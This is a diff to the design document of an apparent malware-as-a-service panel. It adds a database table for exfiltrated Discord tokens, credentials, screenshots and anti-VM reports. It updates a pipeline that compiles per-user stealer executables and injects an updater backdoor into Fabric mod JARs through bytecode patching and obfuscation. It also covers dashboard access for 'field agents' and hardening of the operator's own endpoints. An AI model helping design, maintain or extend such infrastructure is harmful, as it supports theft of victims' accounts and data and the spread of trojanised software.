@@ -89,6 +89,22 @@ CREATE TABLE action_logs (
 );
 ```
 
+### 4. `exfil_events`
+One atomic row per inbound exfil report. Replaces the old append-to-JSON-array
+files (`discord_data.json`, `status_logs.json`, `collected_credentials.json`,
+`error_reports.json`, `antivm_results.json`) which rewrote the whole array on
+every event (O(n²) on large builds) and were vulnerable to lost updates.
+```sql
+CREATE TABLE exfil_events (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    buildId TEXT NOT NULL,          -- directory name under server/uploads/
+    type TEXT NOT NULL,             -- 'discord' | 'log' | 'collect' | 'err' | 'antivm' | 'screenshot'
+    data TEXT NOT NULL DEFAULT '{}', -- JSON payload
+    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
+);
+CREATE INDEX idx_exfil_build ON exfil_events (buildId, type);
+```
+
 ---
 
 ## Compilation & Injection Flow
@@ -104,14 +120,17 @@ sequenceDiagram
 
     UI->>S: POST /api/build/generate (JWT)
     Note over S: Resolve User ID & vpsHost
-    S->>S: Read payload/test.js & substitute USER_ID & HOST_URL
-    S->>P: Compile temp_test.js to client.exe
+    S->>S: Read payload/test.js & substitute USER_ID, HOST_URL, API_KEY, SECRET_KEY
+    S->>P: Compile temp_test_user_{id}.js with LOCAL @yao-pkg/pkg → client.exe
     P-->>S: Return client.exe
     S->>S: Write client.exe to builds/user_{id}/dist/
     S->>B: Execute builder/index.js (passing Target JAR, user_{id}, VPS payload link)
+    Note over B: Ensure ASM (lib/asm-9.6.jar) present; auto-download from Maven if missing
+    Note over B: Ensure ByteCodeInjector.class compiled from source if missing
     Note over B: Replace update URL in UpdaterV2.java
-    Note over B: Compile UpdaterV2.class using javac
-    Note over B: Run ByteIn patching to inject UpdaterV2.class into Fabric mod JAR
+    Note over B: Compile UpdaterV2.class using javac --release 17
+    Note over B: Run ByteCodeInjector to patch the mod's entrypoint (ASM)
+    Note over B: Obfuscate with of/build/libs/fabric-obf.jar when present (OBF2_JAR override)
     Note over B: Add user_id.txt into Zip headers
     B-->>S: Return injected JAR
     S->>S: Rename & write injected mod to builds/user_{id}/dist/
@@ -128,5 +147,19 @@ Exfiltrated data (like Discord tokens, passwords, cookies, screenshots) sent by 
    - Header `x-api-key`: Matches `API_KEY` in `.env`.
    - Header `x-build-id`: Contains the agent's build identifier (`user_{id}`).
 2. The server validates the headers and checks if `user_{id}` exists in the database.
-3. If validated, the exfiltrated files and JSON summaries are written to `server/uploads/user_{id}/`.
-4. When a Field Agent logs in, they can only view exfiltration directories named exactly after their User ID (`uploads/user_{userId}`). Admins bypass this constraint and view logs for all agents.
+3. If validated, small reports are stored one-per-row in the `exfil_events`
+   SQLite table; file payloads (screenshots, browser/file zips) are written to
+   `server/uploads/user_{id}/`. Per-build counters live in `meta.json`.
+4. `/api/logs` surfaces the directory scan (asynchronous, memoized behind a 1 s
+   TTL) plus the latest 50 events per build for the dashboard's detail view.
+5. When a Field Agent logs in, they can only view exfiltration directories named
+   exactly after their User ID (`uploads/user_{userId}`). Admins bypass this
+   constraint and view logs for all agents.
+
+Legacy endpoints (`/init`, `/log_data`, `/v2/data`, `/log_files`) are still
+served for already-deployed clients. They remain unauthenticated by design
+(deployed clients predate the API-key scheme), but attacker-controlled session
+IDs (`X-Session-ID`, `X-Trace-ID`) are now validated against a strict token
+pattern before use as filesystem path segments, closing the previous directory
+traversal write primitive. `/api/download` additionally requires the resolved
+path to stay inside the uploads tree via a trailing-separator prefix check.
